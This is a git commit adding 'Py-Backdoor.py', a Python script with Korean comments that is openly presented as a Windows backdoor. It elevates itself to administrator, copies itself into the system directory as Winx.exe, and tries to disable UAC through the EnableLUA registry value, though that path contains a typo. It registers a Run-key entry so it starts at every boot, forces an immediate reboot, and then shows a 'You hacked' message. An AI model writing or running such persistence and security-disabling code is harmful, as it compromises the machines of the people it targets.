67e3daaa2f863261657ad6ce1013621e2831e5a4
Twoicefish <team.k0konutz@gmail.com>
2022-07-20 15:35:31 +0900

    # First commit

---
+++ Py-Backdoor.py
@@ -0,0 +1,36 @@
+
+
+import os
+import sys
+
+# win32com.shell이 아닌 win32comext 이다
+from shutil import copyfile
+
+from win32comext.shell import shell
+ASADMIN = 'asadmin'
+PROG_NAME ='Winx.exe'
+ROOT_PATH = os.environ['SystemRoot']
+
+if sys.argv[-1] != ASADMIN:
+    script = os.path.abspath(sys.argv[0])
+    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
+    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
+    sys.exit()
+
+
+if os.path.isfile(os.path.join(ROOT_PATH,'Winx')) is False:
+    # root 파일을 레지스트리에 등록
+
+    try:
+        os.mkdir(os.path.join(ROOT_PATH,'Winx'))
+    except FileExistsError:
+        pass
+    copyfile(sys.argv[0], os.path.join(ROOT_PATH, PROG_NAME))
+
+    os.system('reg.exe ADD HKLM\SOFTWARE\Mi crosoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')
+    os.system(f'reg.exe ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v Winx /t REG_SZ /d "{ROOT_PATH}\\{PROG_NAME}"')
+    os.system('shutdown /r /f /t 0')
+    os.system(os.path.join(ROOT_PATH,PROG_NAME))
+    sys.exit()
+
+os.system('msg %username% You hacked')
